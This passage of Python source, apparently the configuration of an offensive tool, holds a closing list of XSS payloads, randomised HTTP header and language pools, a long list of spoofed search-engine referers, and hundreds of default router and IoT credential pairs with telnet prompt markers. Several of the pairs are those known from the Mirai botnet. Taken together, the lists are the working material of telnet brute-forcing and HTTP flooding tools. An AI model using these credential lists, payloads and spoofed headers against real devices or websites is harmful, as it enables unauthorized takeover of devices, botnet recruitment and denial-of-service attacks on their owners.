    '<IMG SRC=javascript:javascript:alert(1)>',
    '<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">',
    '<IMG DYNSRC="javascript:javascript:alert(1)">',
    '<IMG LOWSRC="javascript:javascript:alert(1)">',
    '<BGSOUND SRC="javascript:javascript:alert(1);">',
    '<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>',
    '<TABLE BACKGROUND="javascript:javascript:alert(1)">',
    '<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">',
    '<DIV STYLE="background-image: url(javascript:javascript:alert(1))">',
    '<DIV STYLE="width:expression(javascript:alert(1));">',
    '<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X',
    '<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>'
    ]
    source_string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    accept_encoding_list=['gzip','compress','deflate','br,''identity', '*']
    accept_list=["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","text/html, application/xhtml+xml, image/jxr, */*","text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"]#*/
    accept_charset_list=["iso-8859-1", "utf-8, iso-8859-1;q=0.5", "utf-8,iso-8859-1;q=0.5, *;q=0.1"]
    cache_control_list=[ "no-cache, no-store", "no-store","no-cache"]
    accept_language_list=["af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
    common_passwords_word_list=[
    ":",
    "root:",
    "Admin123:Admin123",
    "admin123:admin123",
    "n/a:admin",
    "adminttd:adminttd",
    "admin:n/a",
    "n/a:PASSWORD",
    "root:!root",
    "netman:netman",
    "n/a:0",
    "admin:epicrouter",
    "n/a:n/a",
    "n/a:secret",
    "admin:admin",
    "Admin:Admin",
    "0:n/a",
    "root:n/a",
    "Manager:Manager",
    "Manager:Friend",
    "user:user",
    "admin:password",
    "user:password",
    "root:root",
    "n/a:atc123",
    "dsladmin:n/a",
    "n/a:ascend",
    "admin:ascend",
    "Manager:n/a",
    "Admin:admin",
    "admin:Admin",
    "admin:bintec",
    "installer;installer",
    "webadmin:webadmin",
    "Admin:1234",
    "admin:1234",
    "netman:n/a",
    "Administrator:admin",
    "Any:n/a",
    "cisco:cisco",
    "n/a:san-fran",
    "n/a:epicrouter",
    "n/a:BRIDGE",
    "n/a:password",
    "user:n/a",
    "admin:epicrouter",
    "login:admin",
    "login:Admin",
    "n/a:cisco",
    "n/a:password",
    "n/a:connect",
    "n/a:ascend",
    "admin:0000",
    "admin:hello",
    "NICONEX:NICONEX",
    "n/a:babbit",
    "admin:operator",
    "Admin:epicrouter",
    "n/a:medion",
    "cablecom:router",
    "admin:Motorola",
    "n/a:1234",
    "m1122:m1122",
    "admin:adslolitec",
    "n/a:pento",
    "admin:mu",
    "admin:microbusiness",
    "superuser:admin",
    "n/a:sitecom",
    "admin:smcadmin",
    "n/a:smcadmin",
    "cusadmin:highspeed",
    "Administrator:n/a",
    "ZXDSL:ZXDSL",
    "ADSL:expert03",
    "root:password",
    "root:12345",
    "n/a:12345",
    "admin:sysadmin",
    "super:super",
    "1502:1502",
    "n/a:access",
    "n/a:system",
    "n/a:1234",
    "root:root",
    'root:calvin',
    'administrator:password',
    'NetLinx:password',
    'administrator:Amx1234!',
    'amx:password',
    'amx:Amx1234!',
    'admin:1988',
    'admin:admin',
    'Administrator:Vision2',
    'cisco:cisco',
    'root:fidel123',
    'user:user',
    'root:default',
    'localadmin:localadmin',
    'Root:wago',
    'Admin:wago',
    'User:user',
    'Guest:guest',
    'root:rootpasswd',
    'admin:password',
    'adtec:none',
    'root:timeserver',
    'root:password',
    'Admin:Su',
    'root:admin',
    'admin:motorola',
    'Admin:5001',
    'User:1001',
    'GE:GE',
    'Admin:Pass',
    'device:apc',
    'apc:apc',
    'root:anni2013',
    'root:xc3511',
    'root:dreambox',
    'root:vizxv',
    'admin:1111111',
    'admin:smcadmin',
    'admin:4321',
    '888888:888888',
    '666666:666666',
    'ubnt:ubnt',
    'admin:22222',
    'adminttd:adminttd',
    'root:!root',
    'admin:epicrouter',
    'tech:tech',
    'manager:manager',
    'smc:smcadmin',
    'netscreen:netscreen',
    'netopia:netopia',
    'root:888888',
    'root:xmhdipc',
    'root:juantech',
    'root:123456',
    'root:54321',
    'support:support',
    'root:root',
    'root:12345',
    'root:pass',
    'admin:admin1234',
    'root:1111',
    'admin:1111',
    'root:666666',
    'root:1234',
    'root:klv123',
    'Administrator:admin',
    'service:service',
    'guest:guest',
    'guest:12345',
    'admin1:password',
    'administrator:1234',
    'root:klv1234',
    'root:Zte521',
    'root:hi3518',
    'root:jvbzd',
    'root:anko',
    'root:zlxx.',
    'root:7ujMko0vizxv',
    'root:7ujMko0admin',
    'root:system',
    'root:ikwb',
    'root:dreambox',
    'root:user',
    'root:realtek',
    'root:00000000',
    'admin:1234',
    'admin:12345',
    'default:OxhlwSG8',
    'admin:tlJwpbo6',
    'default:S2fGqNFs',
    'admin:meinsm',
    'supervisor:supervisor',
    'admin:123456',
    'root:zlxx',
    'dm:telnet',
    'webguest:1',
    'Liebert:Liebert',
    'User:User',
    'admin:avocent',
    'root:linux',
    'admin:system',
    'user:public',
    'admin:private',
    'guest:guest',
    'admin:admin',
    'root:root',
    'qbf77101:hexakisoctahedron',
    'ftpuser:password',
    'USER:USER',
    'Basisk:Basisk',
    'sconsole:12345',
    'root:5up',
    'root:cat1029',
    'MayGion:maygion.com',
    'admin:cat1029',
    'admin:ZmqVfoSIP',
    'default:antslq',
    'admin:microbusiness',
    'admin:jvc',
    'root:GM8182',
    'root:uClinux',
    'Alphanetworks:wrgg19_c_dlwbr_dir300',
    'Alphanetworks:wrgn49_dlob_dir600b',
    'Alphanetworks:wrgn23_dlwbr_dir600b',
    'Alphanetworks:wrgn22_dlwbr_dir615',
    'Alphanetworks:wrgnd08_dlob_dir815',
    'Alphanetworks:wrgg15_di524',
    'Alphanetworks:wrgn39_dlob.hans_dir645',
    'Alphanetworks:wapnd03cm_dkbs_dap2555',
    'Alphanetworks:wapnd04cm_dkbs_dap3525',
    'Alphanetworks:wapnd15_dlob_dap1522b',
    'Alphanetworks:wrgac01_dlob.hans_dir865',
    'Alphanetworks:wrgn23_dlwbr_dir300b',
    'Alphanetworks:wrgn28_dlob_dir412',
    'Alphanetworks:wrgn39_dlob.hans_dir645_V1',
    'root:oelinux123',
    'mg3500:merlin',
    'root:cxlinux',
    'root:1001chin',
    'root:china123',
    'admin:symbol',
    'admin:Symbol',
    'admin:superuser',
    'admin:admin123',
    'root:20080826',
    'enable:system',
    '3500/24:123',
    '3500/24:admin',
    '3500/24:h179350',
    '3500/24:pass',
    '3500/24:user',
    '666666:666666',
    '666666:enable',
    'adfexc:adfexc',
    'admin:0',
    'admin:0000',
    'admin:1111',
    'admin:111111',
    'admin:1111111',
    'admin:1234',
    'admin:12345',
    'admin:123456',
    'admin:1234567890',
    'admin:2222',
    'admin:22222',
    'admin:263297',
    'admin:362729',
    'admin:4321',
    'admin:54321',
    'Admin:5up',
    'admin:7ujMko0admin',
    'admin:abc123',
    'Admin:Admin','admin:admin123','admin:admin1234','admin:Administrator','admin:adslolitec','admin:Ait','admin:BGCVDSL2',
    'admin:cat1029','admin:changeme','admin:cisco','admin:comcast','admin:D-Link','admin:default','admin:diamond','admin:dreambox',
    'admin:enable','admin:extendnet','admin:flvbyctnb','admin:guest','admin:gvt12345','admin:ipcam_rt5350','admin:kont2004',
    'admin:login','admin:manager','admin:meinsm','admin:netgear','admin:OCS','admin:pass','admin:password','admin:pi','admin:radius',
    'admin:radmin','admin:raspberry','admin:rombik1','admin:root','admin:service','admin:smcadmin','admin:support','admin:synnet',
    'admin:telnet','admin:test','admin:toor','admin:ubnt','admin:user','admin:vagrant','admin:vertex25ektks123','admin:vizxv','admin:VTech',
    'admin:Win1doW$','admin:zhongxing','Admin:\x01$-).','admin1:enable','admin1:password','administrator:1234','Administrator:3ware',
    'Administrator:admin','Administrator:enable','Administrator:meinsm','Administrator:password','Administrator:smcadmin','cisco:1234',
    'cisco:12345','cisco:123456','cisco:admin','cisco:Administrator','cisco:changeme','cisco:cisco','cisco:comcast','cisco:default',
    'cisco:guest','cisco:login','cisco:netgear','cisco:pass','cisco:password','cisco:root','cisco:support','cisco:telnet','cisco:toor',
    'cisco:ubnt','cisco:user','cisco:vizxv','client:client','default:antslq','ftp:ftp','Glo:Glo','guest:1111','guest:1234','guest:12345',
    'guest:123456','guest:admin','guest:Administrator','guest:changeme','guest:cisco','guest:comcast','guest:D-Link','guest:default',
    'guest:dreambox','guest:enable','guest:friend','guest:guest','guest:login','guest:manager','guest:netgear','guest:pass','guest:password',
    'guest:pi','guest:raspberry','guest:root','guest:support','guest:telnet','guest:test','guest:toor','guest:ubnt','guest:user','guest:vagrant',
    'guest:vizxv','guest:VTech','login:1234','login:12345','login:123456','login:admin','login:Administrator','login:changeme','login:cisco',
    'login:comcast','login:D-Link','login:default','login:dreambox','login:guest','login:login','login:manager','login:netgear','login:pass',
    'login:password','login:pi','login:raspberry','login:root','login:support','login:telnet','login:test','login:toor','login:ubnt','login:user',
    'login:vagrant','login:vizxv','login:VTech','manager:admin','mg3500:merlin','mlusr:mlusr','mother:enable','mother:fucker','mt7109:wimax',
    'S0u1:YourAnon','YourAnon:S0u1','mtcl:mtcl','netgear:1234','netgear:12345','netgear:123456','netgear:admin','netgear:Administrator',
    'netgear:changeme','netgear:cisco','netgear:comcast','netgear:D-Link','netgear:default','netgear:dreambox','netgear:guest','netgear:login',
    'netgear:manager','netgear:netgear','netgear:password','netgear:pi','netgear:raspberry','netgear:root','netgear:support','netgear:telnet',
    'netgear:test','netgear:ubnt','netgear:user','netgear:vagrant','netgear:VTech','nms:nmspw','root:!root','root:0','root:00000','root:000000',
    'root:1','root:1001chin','root:1111','root:12','root:1234','root:12345','root:123456','root:12345678','root:1234567890','root:1234qwer',
    'root:22222222','root:33','root:333333','root:3ep5w2u','root:54321','root:5up','root:666666','root:7ujMko0admin','root:7ujMko0vizxv',
    'root:888888','root:admin','root:Administrator','root:anko','root:antslq','root:aquario','root:changeme','root:cisco','root:cms500',
    'root:comcast','root:D-Link','root:davox','root:default','root:dreambox','root:enable','root:fivranne','root:GM8182','root:guest','root:hi3518',
    'root:hunt5759','root:ikwb','root:inflection','root:ivdev','root:juantech','root:jvbzd','root:klv123','root:klv1234','root:login','root:manager',
    'root:netgear','root:oracle','root:pass','root:password','root:permit','root:pi','root:public','root:raspberry','root:realtek','root:root',
    'root:root123','root:support','root:t0talc0ntr0l4!','root:telnet','root:test','root:tiger','root:toor','root:tslinux','root:ubnt','root:user',
    'root:vagrant','root:vizxv','root:VTech','root:W!n0&oO7.','root:Win1doW$','root:xc3511','root:xmhdipc'
    ]
    wordlist= list(dict.fromkeys(common_passwords_word_list))
    referers_list=[
        'http://help.baidu.com/searchResult?keywords=',
        'http://www.bing.com/search?q=',
        'https://www.yandex.com/yandsearch?text=',
        'https://duckduckgo.com/?q=',
        'http://www.ask.com/web?q=',
        'http://search.aol.com/aol/search?q=',
        'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
        'https://drive.google.com/viewerng/viewer?url=',
        'http://validator.w3.org/feed/check.cgi?url=',
        'http://host-tracker.com/check_page/?furl=',
        'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
        'http://jigsaw.w3.org/css-validator/validator?uri=',
        'https://add.my.yahoo.com/rss?url=',
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'https://steamcommunity.com/market/search?q=',
        'http://filehippo.com/search?q=',
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
        'http://eu.battle.net/wow/en/search?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://careers.gatesfoundation.org/search?q=',
        'http://techtv.mit.edu/search?q=',
        'http://www.ustream.tv/search?q=',
        'http://www.ted.com/search?q=',
        'http://funnymama.com/search?q=',
        'http://itch.io/search?q=',
        'http://jobs.rbs.com/jobs/search?q=',
        'http://taginfo.openstreetmap.org/search?q=',
        'http://www.baoxaydung.com.vn/news/vn/search&q=',
        'https://play.google.com/store/search?q=',
        'http://www.tceq.texas.gov/@@tceq-search?q=',
        'http://www.reddit.com/search?q=',
        'http://www.bestbuytheater.com/events/search?q=',
        'https://careers.carolinashealthcare.org/search?q=',
        'http://jobs.leidos.com/search?q=',
        'http://jobs.bloomberg.com/search?q=',
        'https://www.pinterest.com/search/?q=',
        'http://millercenter.org/search?q=',
        'https://www.npmjs.com/search?q=',
        'http://www.evidence.nhs.uk/search?q=',
        'http://www.shodanhq.com/search?q=',
        'http://ytmnd.com/search?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'https://steamcommunity.com/market/search?q=',
        'http://filehippo.com/search?q=',
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
        'http://eu.battle.net/wow/en/search?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://careers.gatesfoundation.org/search?q=',
        'http://techtv.mit.edu/search?q=',
        'http://www.ustream.tv/search?q=',
        'http://www.ted.com/search?q=',
        'http://funnymama.com/search?q=',
        'http://itch.io/search?q=',
        'http://jobs.rbs.com/jobs/search?q=',
        'http://taginfo.openstreetmap.org/search?q=',
        'http://www.baoxaydung.com.vn/news/vn/search&q=',
        'https://play.google.com/store/search?q=',
        'http://www.tceq.texas.gov/@@tceq-search?q=',
        'http://www.reddit.com/search?q=',
        'http://www.bestbuytheater.com/events/search?q=',
        'https://careers.carolinashealthcare.org/search?q=',
        'http://jobs.leidos.com/search?q=',
        'http://jobs.bloomberg.com/search?q=',
        'https://www.pinterest.com/search/?q=',
        'http://millercenter.org/search?q=',
        'https://www.npmjs.com/search?q=',
        'http://www.evidence.nhs.uk/search?q=',
        'http://www.shodanhq.com/search?q=',
        'http://ytmnd.com/search?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'https://steamcommunity.com/market/search?q=',
        'http://filehippo.com/search?q=',
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
        'http://eu.battle.net/wow/en/search?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://careers.gatesfoundation.org/search?q=',
        'http://techtv.mit.edu/search?q='
        'http://www.ustream.tv/search?q=',
        'http://www.ted.com/search?q=',
        'http://funnymama.com/search?q=',
        'http://itch.io/search?q=',
        'http://jobs.rbs.com/jobs/search?q=',
        'http://taginfo.openstreetmap.org/search?q=',
        'http://www.baoxaydung.com.vn/news/vn/search&q=',
        'https://play.google.com/store/search?q=',
        'http://www.tceq.texas.gov/@@tceq-search?q=',
        'http://www.reddit.com/search?q=',
        'http://www.bestbuytheater.com/events/search?q=',
        'https://careers.carolinashealthcare.org/search?q=',
        'http://jobs.leidos.com/search?q=',
        'http://jobs.bloomberg.com/search?q=',
        'https://www.pinterest.com/search/?q=',
        'http://millercenter.org/search?q=',
        'https://www.npmjs.com/search?q=',
        'http://www.evidence.nhs.uk/search?q=',
        'http://www.shodanhq.com/search?q=',
        'http://ytmnd.com/search?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'https://steamcommunity.com/market/search?q=',
        'http://filehippo.com/search?q=',
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
        'http://eu.battle.net/wow/en/search?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://careers.gatesfoundation.org/search?q=',
        'http://techtv.mit.edu/search?q=',
        'http://www.ustream.tv/search?q=',
        'http://www.ted.com/search?q=',
        'http://funnymama.com/search?q=',
        'http://itch.io/search?q=',
        'http://jobs.rbs.com/jobs/search?q=',
        'http://taginfo.openstreetmap.org/search?q=',
        'http://www.baoxaydung.com.vn/news/vn/search&q=',
        'https://play.google.com/store/search?q=',
        'http://www.tceq.texas.gov/@@tceq-search?q=',
        'http://www.reddit.com/search?q=',
        'http://www.bestbuytheater.com/events/search?q=',
        'https://careers.carolinashealthcare.org/search?q=',
        'http://jobs.leidos.com/search?q=',
        'http://jobs.bloomberg.com/search?q=',
        'https://www.pinterest.com/search/?q=',
        'http://millercenter.org/search?q=',
        'https://www.npmjs.com/search?q=',
        'http://www.evidence.nhs.uk/search?q=',
        'http://www.shodanhq.com/search?q=',
        'http://ytmnd.com/search?q=',
        'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
        'http://www.google.com/?q=',
        'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
        'https://drive.google.com/viewerng/viewer?url=',
        'http://www.google.com/translate?u=',
        'https://developers.google.com/speed/pagespeed/insights/?url=',
        'http://help.baidu.com/searchResult?keywords=',
        'http://www.bing.com/search?q=',
        'https://add.my.yahoo.com/rss?url=',
        'https://play.google.com/store/search?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=']
    domains_list=[x.split('://')[1].split('/')[0] for x in referers_list]
    telnet_prompts_list=['$','#','>']
